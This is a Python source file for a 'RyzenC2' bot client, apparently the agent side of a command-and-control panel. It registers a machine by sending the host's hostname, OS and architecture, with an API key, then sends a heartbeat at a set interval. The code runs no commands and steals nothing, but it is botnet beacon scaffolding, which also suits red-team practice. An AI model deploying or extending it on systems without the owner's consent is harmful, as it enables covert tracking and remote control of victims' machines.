#!/usr/bin/env python3
"""bot/bot_client.py — HTTP register + heartbeat to panel"""
import argparse
import json
import platform
import time
import uuid
import urllib.request
import urllib.error

def post(url: str, data: dict, key: str, timeout=10):
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Content-Type": "application/json",
            "X-API-Key": key,
            "User-Agent": f"RyzenC2-Bot/{platform.system()}",
        },
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode())

def get(url: str, key: str, timeout=10):
    req = urllib.request.Request(url, headers={"X-API-Key": key})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode())

def main():
    p = argparse.ArgumentParser(description="RyzenC2 Bot Client")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--key", default="ryzenc2_api_key_change_me")
    p.add_argument("--interval", type=int, default=30)
    args = p.parse_args()
    base = f"http://{args.host}:{args.port}"
    bot_id = str(uuid.uuid4())
    info = {
        "uuid": bot_id,
        "ip": "0.0.0.0",
        "os": platform.system(),
        "arch": platform.machine(),
        "hostname": platform.node(),
        "version": "8.0.0",
        "status": "online",
    }
    print(f"[*] RyzenC2 Bot {bot_id[:12]}")
    print(f"[*] C2 {base} | {info['os']} {info['arch']}")
    # register via simulate-like or custom endpoint
    try:
        post(f"{base}/api/v1/bots/register", info, args.key)
        print("[+] Registered")
    except Exception as e:
        print(f"[!] Register: {e} (panel may use simulate)")
    while True:
        try:
            post(f"{base}/api/v1/bots/heartbeat", {"uuid": bot_id, "status": "online"}, args.key)
            print(f"[*] Heartbeat {bot_id[:12]}")
        except Exception as e:
            print(f"[!] HB fail: {e}")
        time.sleep(args.interval)

if __name__ == "__main__":
    main()
